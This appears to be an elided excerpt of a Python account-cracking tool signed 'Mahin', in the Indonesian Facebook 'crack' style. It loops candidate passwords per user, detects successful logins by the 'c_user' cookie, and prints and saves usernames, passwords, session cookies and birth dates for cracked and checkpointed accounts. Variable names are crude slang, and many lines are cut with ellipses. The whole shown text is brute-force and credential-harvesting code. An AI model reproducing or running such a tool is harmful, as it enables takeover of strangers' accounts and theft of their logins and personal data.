...
\033[1;92m [•] \033[1;31;1mAuthor    : \033[1;92m 𝓜𝓪𝓱𝓲𝓷
    ...
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[𝓜𝓪𝓱𝓲𝓷-CP] ", "")}{N}')

                try:

                    log_hasil(titid[0].replace("[𝓜𝓪𝓱𝓲𝓷-CP] ", ""), titid[1])
            ...
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}𝓜𝓪𝓱𝓲𝓷meta1.py{N}'");exit()
...
# PROSES CRACK METODE 3 in 1
    ...
    def __metode__(self, cebok, user, pasw):
        ...
        animasi = random.choice(["\x1b[1;92m[𝓜𝓪𝓱𝓲𝓷]","\x1b[1;92m[𝓜𝓪𝓱𝓲𝓷]","\x1b[1;92m[𝓜𝓪𝓱𝓲𝓷]","\x1b[1;92m[𝓜𝓪𝓱𝓲𝓷]","\x1b[1;92m[𝓜𝓪𝓱𝓲𝓷]","\x1b[1;92m[𝓜𝓪𝓱𝓲𝓷]","\x1b[1;92m[𝓜𝓪𝓱𝓲𝓷]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print('\r %s[𝓜𝓪𝓱𝓲𝓷-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))

                        print(f'\r {H}Cookie   : {coki}\n')

                    elif "y" in Apk:

                        print(f'\r %s[𝓜𝓪𝓱𝓲𝓷-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))

                        print(f'\r {H}Cookie   : {coki}')

                    wrt = '[𝓜𝓪𝓱𝓲𝓷-OK] %s • %s' % (user,pw)
                    ...
                    try:
                        ...
                        print('\r %s[𝓜𝓪𝓱𝓲𝓷-CP] %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))

                        wrt = '[𝓜𝓪𝓱𝓲𝓷-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
